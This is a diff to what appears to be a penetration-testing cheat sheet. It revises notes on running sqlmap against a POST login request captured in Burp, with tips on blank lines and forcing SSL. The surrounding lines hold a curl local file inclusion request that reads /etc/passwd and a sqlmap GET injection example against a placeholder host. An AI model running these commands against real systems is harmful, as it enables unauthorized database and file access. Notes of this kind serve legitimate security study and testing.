@@ -357,7 +357,10 @@ curl -s http://INSERTIPADDRESS/gallery.php?page=/etc/passwd
 
 ```
 # Post
-./sqlmap.py -r search-test.txt -p tfUPass
+./sqlmap.py -r request.txt -p username
+grab the request from burp and take out blank lines except for last one before login parameters, username is just example parameter
+sqlmap will default to 80, if you want to use 443 use the flag --force-ssl
+
 
 # Get
 sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql
